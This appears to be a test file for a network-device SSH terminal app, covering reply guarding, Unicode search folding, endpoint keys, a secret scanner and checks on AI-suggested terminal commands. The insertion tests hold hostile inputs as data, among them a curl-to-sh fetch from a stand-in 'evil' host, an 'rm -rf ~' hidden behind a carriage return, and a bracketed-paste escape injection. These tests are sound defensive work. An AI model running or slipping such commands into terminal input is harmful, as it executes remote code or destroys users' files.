// Run: npm test  (node --experimental-strip-types --test)
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { ReplyGuard } from './replyGuard.ts'
import { fold, foldMatches } from './foldMatch.ts'
import { checkInsert, isDangerousCommand } from './dangerous.ts'
import { scanForSecrets } from './secretScan.ts'
import { endpointKey } from './endpoint.ts'

const deferred = () => {
  let resolve, reject
  const promise = new Promise((res, rej) => ((resolve = res), (reject = rej)))
  return { promise, resolve, reject }
}

/* The config-check flow from AppLayout, reduced: connect invalidates, a check
   (unless throttled) begins, and the reply only lands while still current. */
async function scenario(settle) {
  const guard = new ReplyGuard()
  const landed = []
  const connect = () => guard.invalidate('s1')
  const check = (d) => {
    const current = guard.begin('s1')
    d.promise.then(
      (v) => current() && landed.push(v),
      (e) => current() && landed.push(`err:${e}`),
    )
  }
  connect()
  const a = deferred()
  check(a) // check A in flight
  connect() // connection dropped and redialled; check B throttled, never begins
  settle(a)
  await new Promise((r) => setTimeout(r, 0))
  return landed
}

test('a reply from before a throttled reconnect is dropped (resolve)', async () => {
  assert.deepEqual(await scenario((d) => d.resolve('A')), [])
})

test('a reply from before a throttled reconnect is dropped (reject)', async () => {
  assert.deepEqual(await scenario((d) => d.reject('boom')), [])
})

test('the latest check still lands; a reused key never revives an old token', () => {
  const g = new ReplyGuard()
  const old = g.begin('s1')
  g.retain(new Set()) // tab closed
  const fresh = g.begin('s1') // id reused
  assert.equal(old(), false)
  assert.equal(fresh(), true)
})

const marked = (text, q) => foldMatches(text, q).map(([s, e]) => text.slice(s, e))

test('expanding lowercase maps back to whole source characters', () => {
  assert.deepEqual(marked('İ', 'i'), ['İ'])
  assert.deepEqual(marked('İİİ Needle x', 'needle'), ['Needle'])
})

test('contextual final sigma matches like the backend', () => {
  assert.deepEqual(marked('ΟΣ', 'ος'), ['ΟΣ'])
})

test('plain case-insensitive matching, all occurrences', () => {
  assert.deepEqual(marked('Show run; show RUN', 'show run'), ['Show run', 'show RUN'])
  assert.deepEqual(marked('abc', ''), [])
})

test('Turkish dotted I and Greek sigma fold like the backend search', () => {
  assert.deepEqual(marked('İSTANBUL office', 'istanbul'), ['İSTANBUL'])
  assert.deepEqual(marked('flight to izmir', 'İzmir'), ['izmir'])
  assert.deepEqual(marked('ΠΑΝΕΠΙΣΤΗΜΙΟ', 'ΠΑΝΕΠΙΣ'), ['ΠΑΝΕΠΙΣ'])
  assert.deepEqual(marked('οδος', 'οδοσ'), ['οδος'])
  // Same strings as the Rust fold tests.
  assert.equal(fold('ΟΣ'), 'οσ')
  assert.equal(fold('İ'), 'i')
})

/* ------------------------------------------------ AI "Insert into terminal" */

test('one-line suggestions insert; multi-line needs a confirm', () => {
  assert.deepEqual(checkInsert('show interfaces status'), { kind: 'ok' })
  assert.deepEqual(checkInsert('ls -la\ncurl -s https://evil/x | sh\nuptime'), { kind: 'multiline', lines: 3 })
  assert.deepEqual(checkInsert('for i in 1 2; do\techo $i; done'), { kind: 'ok' })
})

test('control characters in a suggestion are refused', () => {
  for (const bad of ['ls\rrm -rf ~', 'x\x1b[201~curl evil|sh', 'abc\x03', 'a\x15b', 'a\x7f', 'a\u0085b', 'a\u2028b']) {
    assert.equal(checkInsert(bad).kind, 'refuse', JSON.stringify(bad))
  }
})

test('the destructive-command check sees every line of a suggestion', () => {
  assert.ok(isDangerousCommand('show version\nreload in 5'))
  assert.equal(isDangerousCommand('show version'), null)
})

/* ------------------------------------------------------- endpoint identity */

const host = (over) => ({ kind: 'host', id: 'h-1', name: 'fw', hostname: '10.0.0.1', port: 22, username: 'admin', auth: 'password', ...over })

test('same address, different entries: different endpoint keys', () => {
  const none = () => undefined
  const a = endpointKey(host({ id: 'h-prod' }), none)
  const b = endpointKey(host({ id: 'h-lab' }), none)
  assert.notEqual(a, b)
  assert.equal(a, 'host:h-prod')
})

test('quick connect keys by user@host:port, never by its per-dial id', () => {
  const none = () => undefined
  const one = endpointKey(host({ id: 'qc-abc', hostname: 'FW.example' }), none)
  const two = endpointKey(host({ id: 'qc-def', hostname: 'fw.example' }), none)
  assert.equal(one, 'qc:admin@fw.example:22')
  assert.equal(one, two)
  assert.notEqual(one, endpointKey(host({ id: 'qc-x', hostname: 'fw.example', port: 2222 }), none))
  assert.notEqual(one, endpointKey(host({ id: 'qc-x', hostname: 'fw.example', username: 'readonly' }), none))
})

test('the jump host is part of the identity, resolved like the dialer', () => {
  const bastions = { 'b-1': host({ id: 'b-1' }), 'b-2': host({ id: 'b-2' }) }
  const find = (id) => bastions[id]
  const viaA = endpointKey(host({ id: 'h-1', jumpHostId: 'b-1' }), find)
  const viaB = endpointKey(host({ id: 'h-1', jumpHostId: 'b-2' }), find)
  assert.equal(viaA, 'host:h-1|via:host:b-1')
  assert.notEqual(viaA, viaB)
  // Missing or self-referencing bastions dial direct, so they key as direct.
  assert.equal(endpointKey(host({ id: 'h-1', jumpHostId: 'gone' }), find), 'host:h-1')
  assert.equal(endpointKey(host({ id: 'h-1', jumpHostId: 'h-1' }), find), 'host:h-1')
  assert.equal(endpointKey(host({ id: 'local-zsh', local: { profile: 'zsh' } }), find), 'local:zsh')
})

/* ----------------------------------------------------------- secret scanner */

const reasons = (text) => scanForSecrets(text).map((h) => h.reason)

test('network-device secrets are flagged', () => {
  for (const line of [
    'username admin privilege 15 secret 9 $9$abc',
    'snmp-server community s3cr3t RO',
    ' pre-shared-key ascii-text 0 hunter22',
    ' key-string 7 0822455D0A16',
    'tacacs-server key 7 060506324F41',
    'radius-server host 10.1.1.1 key s3cret',
    '<phash>$1$abcdefgh$ijklmnop</phash>',
    'curl -H "Authorization: Bearer abcdef0123456789abcdef"',
    'token eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N',
  ]) {
    assert.ok(reasons(line).length > 0, line)
  }
  assert.deepEqual(reasons('show interfaces status\ninterface Gi0/1\n description uplink'), [])
})

test('a private key body is flagged even without its BEGIN line', () => {
  const body = Array.from({ length: 4 }, (_, i) => 'A'.repeat(63) + String(i)).join('\n')
  assert.ok(reasons(`fw# cat key\n${body}\n-----END OPENSSH PRIVATE KEY-----`).some((r) => r.includes('base64')))
  // Never shows the secret itself.
  assert.ok(scanForSecrets(body).every((h) => !h.preview.includes('AAAA')))
})
